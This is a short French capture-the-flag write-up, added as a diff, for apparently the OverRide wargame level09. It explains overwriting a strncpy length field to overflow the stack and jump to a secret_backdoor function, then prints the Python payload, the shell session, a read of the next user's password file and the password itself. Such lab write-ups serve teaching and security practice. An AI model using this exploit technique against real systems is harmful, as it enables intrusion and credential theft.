@@ -1,0 +1,22 @@
+on peut voir que le binnaire ecrit 41 caracteres dans l'username
+aussi on peut re-ecrire le parametre que prends le strncpy par ce que l on veut, 0xff fera l'affaire
+on remplira donc l'username avec des A , puis un 0xff pour la longueur de copie, le \n pour forcer la
+fin de la lecture de ce fgets la, puis 200 B pour bourrer jusqu'a RSP, la on force l'addresse de la foncion
+secret_backdoor, on force ensuite la fin de la lecture d'un fgets puis on envoi /bin/sh en parametre pour
+la fonction secret_backdoor
+
+python -c "print('A' * 40 + '\xff' + '\n' + 'B' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]) + '\n' + '/bin/sh'" > /tmp/lvl9
+level09@OverRide:~$ cat /tmp/lvl9 - | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+Segmentation fault (core dumped)
+
+et voila :)
